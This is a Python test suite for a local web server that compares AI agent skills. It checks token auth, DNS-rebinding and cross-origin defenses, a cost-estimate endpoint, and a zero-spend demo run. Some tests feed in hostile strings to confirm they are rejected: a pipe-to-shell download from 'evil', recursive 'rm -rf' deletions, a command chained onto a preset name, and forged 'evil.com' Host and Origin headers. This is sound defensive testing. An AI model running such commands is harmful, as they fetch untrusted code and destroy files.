"""
Stdlib-only tests for the `skill-ab serve` local web app (Plan 021).

These drive a REAL ThreadingHTTPServer on an ephemeral port (no `claude`, no `git`,
no network beyond localhost loopback). They cover the security model (token auth,
DNS-rebinding Host check, cross-Origin POST rejection), the estimate endpoint, and a
full DEMO run end-to-end (SSE event sequence + written run dir) -- all with ZERO
spend, since demo mode replays the bundled `_demo_results()` instead of spawning an
agent. Run: `python3 test_skill_ab_server.py`.
"""

from __future__ import annotations

import contextlib
import http.client
import json
import socket
import tempfile
import threading
import time
from pathlib import Path

import skill_ab_harness as h
import skill_ab_server as s

TOKEN = "TESTTOK"


# --------------------------------------------------------------------------
# Harness: a real server in a background thread on an ephemeral port
# --------------------------------------------------------------------------

@contextlib.contextmanager
def _serve():
    """Yield (port, runs_dir) for a live server; always shut it down afterwards so a
    failing assertion can't leak a thread/socket into the next test."""
    with tempfile.TemporaryDirectory() as td:
        runs_dir = Path(td)
        httpd = s.make_server(runs_dir=runs_dir, token=TOKEN, port=0)
        port = httpd.server_address[1]          # port 0 -> the kernel-assigned port
        th = threading.Thread(target=httpd.serve_forever, daemon=True)
        th.start()
        try:
            yield port, runs_dir
        finally:
            httpd.shutdown()
            httpd.server_close()
            th.join(timeout=5)


def _request(port, method, path, *, token=None, host=None, origin=None, body=None):
    """One HTTP request with fine-grained control over Host/Origin/token so the
    security tests can forge each independently. `host=None` lets http.client set the
    correct `127.0.0.1:<port>` Host (the legitimate case); a string forges it."""
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    payload = None
    if body is not None:
        payload = body if isinstance(body, bytes) else json.dumps(body).encode()
    # skip_host=True only when we forge Host, else http.client adds the real one.
    conn.putrequest(method, path, skip_host=(host is not None),
                    skip_accept_encoding=True)
    if host is not None:
        conn.putheader("Host", host)
    if token is not None:
        conn.putheader("X-Skill-AB-Token", token)
    if origin is not None:
        conn.putheader("Origin", origin)
    if payload is not None:
        conn.putheader("Content-Type", "application/json")
        conn.putheader("Content-Length", str(len(payload)))
    conn.endheaders(message_body=payload)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, data


def _read_sse(port, run_id, token, overall_timeout=20.0):
    """Read an SSE stream until a terminal event (experiment_done/error) or timeout.
    A socket timeout + an overall deadline guarantee a hung stream FAILS FAST instead
    of blocking the whole suite. Returns (status, [parsed Event dicts])."""
    terminal = {"experiment_done", "error"}
    # The constructor timeout sets the socket timeout, which persists on the
    # response's socket for a close-delimited stream (http.client nulls conn.sock
    # after getresponse), so a stalled read raises socket.timeout, never blocks.
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=overall_timeout)
    conn.request("GET", f"/api/runs/{run_id}/events",
                 headers={"X-Skill-AB-Token": token})
    resp = conn.getresponse()
    if resp.status != 200:
        conn.close()
        return resp.status, []
    deadline = time.monotonic() + overall_timeout
    events: list[dict] = []
    buf = b""
    try:
        while time.monotonic() < deadline:
            try:
                chunk = resp.read(1)            # byte-at-a-time: stop right at the
            except (TimeoutError, socket.timeout):  # terminal event, never over-read
                break
            if not chunk:
                break
            buf += chunk
            if not buf.endswith(b"\n"):
                continue
            line, buf = buf.strip(), b""
            if line.startswith(b"data:"):
                payload = line[5:].strip()
                if payload:
                    with contextlib.suppress(json.JSONDecodeError):
                        events.append(json.loads(payload.decode()))
                if events and events[-1].get("type") in terminal:
                    break
    finally:
        conn.close()
    return 200, events


def _eventually(fn, timeout=5.0, interval=0.05):
    """Retry an assertion-raising probe until it passes or the timeout elapses --
    insures the report/list checks against a tiny write-then-emit race."""
    deadline = time.monotonic() + timeout
    while True:
        try:
            return fn()
        except AssertionError:
            if time.monotonic() >= deadline:
                raise
            time.sleep(interval)


def _start_req(**over):
    """A complete StartReq/EstimateReq body; tests override only what they exercise."""
    req = {"skill_a": "write-tests-first", "skill_b": None, "target": ".",
           "k": 6, "isolation": "inject", "judge": False, "demo": False}
    req.update(over)
    return req


# --------------------------------------------------------------------------
# Token auth on /api/*
# --------------------------------------------------------------------------

def test_health_ok_with_header_token():
    with _serve() as (port, _):
        st, data = _request(port, "GET", "/api/health", token=TOKEN)
        assert st == 200, (st, data)
        body = json.loads(data)
        assert body["ok"] is True
        # The frozen health schema must be fully present for the Settings view.
        for key in ("claude_on_path", "runs_dir", "harness_version", "model"):
            assert key in body, key


def test_health_ok_with_query_token():
    # The app shell also passes the token as ?token= (e.g. for the EventSource URL).
    with _serve() as (port, _):
        st, data = _request(port, "GET", f"/api/health?token={TOKEN}")
        assert st == 200
        assert json.loads(data)["ok"] is True


def test_skills_endpoint_lists_installed_skills():
    with _serve() as (port, _):
        st, data = _request(port, "GET", "/api/skills", token=TOKEN)
        assert st == 200, (st, data)
        body = json.loads(data)
        assert isinstance(body["skills"], list)        # may be empty in CI; shape only
        for sk in body["skills"]:                       # each entry is name+source+path
            assert {"name", "source", "path"} <= set(sk)
        # token still required for the picker endpoint
        st2, _ = _request(port, "GET", "/api/skills")
        assert st2 == 403


def test_health_missing_token_403():
    with _serve() as (port, _):
        st, _data = _request(port, "GET", "/api/health")
        assert st == 403


def test_health_wrong_token_403():
    with _serve() as (port, _):
        st, _data = _request(port, "GET", "/api/health", token="WRONG")
        assert st == 403


# --------------------------------------------------------------------------
# DNS-rebinding (Host) + cross-Origin (POST) defenses
# --------------------------------------------------------------------------

def test_foreign_host_header_403():
    # A valid token must NOT save a request whose Host points at a rebound name.
    with _serve() as (port, _):
        st, _data = _request(port, "GET", "/api/health", token=TOKEN, host="evil.com")
        assert st == 403


def test_cross_origin_post_403():
    with _serve() as (port, _):
        st, _data = _request(port, "POST", "/api/runs", token=TOKEN,
                             origin="http://evil.com", body=_start_req(demo=True))
        assert st == 403


# --------------------------------------------------------------------------
# Estimate (cost gate)
# --------------------------------------------------------------------------

def test_estimate_returns_projection():
    with _serve() as (port, _):
        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
                            body=_start_req(k=2))
        assert st == 200, (st, data)
        body = json.loads(data)
        # 1 task x 2 arms (skill_b=None) x k=2 = 4 runs; projected_usd may be null
        # when no per-run prior is configured -- the field must still be present.
        assert isinstance(body["n_runs"], int) and body["n_runs"] > 0
        assert "projected_usd" in body


def test_resolve_runner_preset_allowlists_names_rejects_raw_commands():
    # SECURITY (plan 022, blocker #5): the UI may select a curated preset NAME only.
    assert s._resolve_runner_preset(None) is None
    assert s._resolve_runner_preset("") is None
    assert s._resolve_runner_preset("claude") is None      # built-in / default
    assert s._resolve_runner_preset("default") is None
    assert s._resolve_runner_preset("codex") == "codex"    # curated engine preset
    assert s._resolve_runner_preset("CODEX") == "codex"    # case-insensitive
    # a RAW command template is rejected, never passed through -> no loopback RCE
    for hostile in ("sh -c 'curl evil|sh'", "rm -rf ~", "codex; rm -rf /", "./x.sh"):
        try:
            s._resolve_runner_preset(hostile)
            assert False, f"raw command should be rejected: {hostile!r}"
        except ValueError:
            pass


def test_build_run_config_runner_b_preset_only_arm_a_and_control_stay_claude():
    # Arm B may be the curated `codex` preset; arm A and the control are ALWAYS claude.
    # A raw command anywhere is refused. runner_a/runner_off are never read at all.
    orig_skill, orig_target = h.resolve_skill, h.resolve_target
    h.resolve_skill = lambda name: Path(f"/fake/skills/{name}/SKILL.md")
    h.resolve_target = lambda target, prompt: (Path("/fake/repo"), "HEAD",
                                               prompt or "do x", None, None)
    try:
        with tempfile.TemporaryDirectory() as td:
            # curated preset for arm B is honored; hostile runner_a/off are ignored
            cfg, _ = s._build_run_config(
                {"skill_a": "skill-a", "skill_b": None, "target": ".", "prompt": "x",
                 "k": 2, "runner_b": "codex",
                 "runner_a": "sh -c 'curl evil|sh'", "runner_off": "rm -rf ~"},
                Path(td))
            assert cfg.runner_b == "codex"          # arm B = codex
            assert cfg.runner_a is None             # arm A is always claude (never read)
            assert cfg.runner_off is None           # control is always claude (never read)
            assert cfg.skill_b_name is None and cfg.model_b is None   # codex: no skill/model
            assert h._pair_is_cross_runner(cfg, *h.primary_pair(cfg))

            # a RAW command in runner_b is refused (ValueError -> 400 at the handler)
            try:
                s._build_run_config(
                    {"skill_a": "skill-a", "target": ".", "prompt": "x",
                     "runner_b": "sh -c 'curl evil|sh'"}, Path(td))
                assert False, "raw runner_b command should be rejected"
            except ValueError:
                pass
    finally:
        h.resolve_skill, h.resolve_target = orig_skill, orig_target


def test_skills_endpoint_exposes_runner_presets():
    with _serve() as (port, _):
        st, data = _request(port, "GET", "/api/skills", token=TOKEN)
        assert st == 200
        body = json.loads(data)
        ids = [r["id"] for r in body["runners"]]
        assert "claude" in ids and "codex" in ids       # built-in + curated preset


def test_estimate_model_comparison_counts_two_arms_no_control():
    # Skill B = none + a different Model B + no control -> compare the SAME skill
    # under two models = exactly 2 arms (1 task x 2 x k), not a 2-arm skill/control
    # plus baseline. k=3 -> 6 runs.
    with _serve() as (port, _):
        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
                            body=_start_req(k=3, skill_b=None,
                                            model_b="claude-opus-4-8",
                                            include_control=False))
        assert st == 200, (st, data)
        assert json.loads(data)["n_runs"] == 6


def test_estimate_bad_input_returns_error_body_not_projection():
    # The estimate endpoint returns 200 with {error} (not a 4xx) for bad input -- the
    # web UI relies on this shape: it treats an {error} body as a failure and keeps the
    # Start button locked rather than rendering it as a usage projection.
    with _serve() as (port, _):
        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
                            body=_start_req(runner_b="sh -c 'curl evil|sh'"))
        assert st == 200, (st, data)
        body = json.loads(data)
        assert "error" in body and "n_runs" not in body
        assert "raw command" in body["error"]


def test_estimate_cross_cli_counts_codex_arm():
    # runner_b=codex makes a head-to-head even with no skill B: claude+skill vs codex
    # (+ control). k=2 -> 3 arms x 2 = 6; drop the control -> 2 arms x 2 = 4.
    with _serve() as (port, _):
        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
                            body=_start_req(k=2, skill_b=None, runner_b="codex"))
        assert st == 200, (st, data)
        assert json.loads(data)["n_runs"] == 6
        st2, data2 = _request(port, "POST", "/api/estimate", token=TOKEN,
                              body=_start_req(k=2, skill_b=None, runner_b="codex",
                                              include_control=False))
        assert json.loads(data2)["n_runs"] == 4


# --------------------------------------------------------------------------
# Demo run end-to-end: SSE sequence + written run dir, ZERO spend
# --------------------------------------------------------------------------

def test_demo_run_end_to_end_no_claude():
    with _serve() as (port, runs_dir):
        # run_agent is THE function that spawns `claude`; if the demo path touches
        # it, this trips and the no-spend guarantee is broken.
        spawned = {"claude": False}
        orig_run_agent = h.run_agent

        def _boom(*_a, **_k):
            spawned["claude"] = True
            raise AssertionError("demo mode must never spawn claude")

        h.run_agent = _boom
        try:
            st, data = _request(port, "POST", "/api/runs", token=TOKEN,
                                body=_start_req(demo=True))
            assert st == 202, (st, data)
            run_id = json.loads(data)["run_id"]

            status, events = _read_sse(port, run_id, TOKEN)
            assert status == 200
            assert spawned["claude"] is False, "demo must not spawn claude"

            types = [e["type"] for e in events]
            assert "experiment_start" in types
            assert types.count("run_start") >= 1
            assert any(t == "agent" for t in types)
            assert "run_done" in types
            assert "error" not in types
            assert types[-1] == "experiment_done", types[-3:]
            assert events[-1].get("run_id") == run_id

            # The run is now listed by the Dashboard endpoint...
            def _listed():
                st2, d2 = _request(port, "GET", "/api/runs", token=TOKEN)
                assert st2 == 200
                ids = [r["id"] for r in json.loads(d2)["runs"]]
                assert run_id in ids
            _eventually(_listed)

            # ...and its self-contained report renders.
            def _report():
                st3, d3 = _request(port, "GET", f"/api/runs/{run_id}/report",
                                   token=TOKEN)
                assert st3 == 200
                assert b"</html>" in d3
            _eventually(_report)

            # And a real run dir was written to disk (report+summary).
            assert (runs_dir / run_id / "summary.json").exists()
        finally:
            h.run_agent = orig_run_agent


# --------------------------------------------------------------------------
# App shell smoke (frozen inter-module contract)
# --------------------------------------------------------------------------

def test_app_shell_embeds_token_and_references_api():
    # Imported lazily so the server tests still run if only the app module is absent.
    import skill_ab_app as app
    shell = app.app_shell_html("ABC123TOK")
    assert "ABC123TOK" in shell                 # token embedded for the frontend
    assert "SKILL_AB_TOKEN" in shell            # window global the JS reads
    assert "EventSource" in shell               # consumes the SSE stream
    assert "/api/" in shell                     # talks to the API


def _run_all() -> None:
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    for fn in fns:
        fn()
        print(f"ok  {fn.__name__}")
    print(f"\n{len(fns)} passed")


if __name__ == "__main__":
    _run_all()
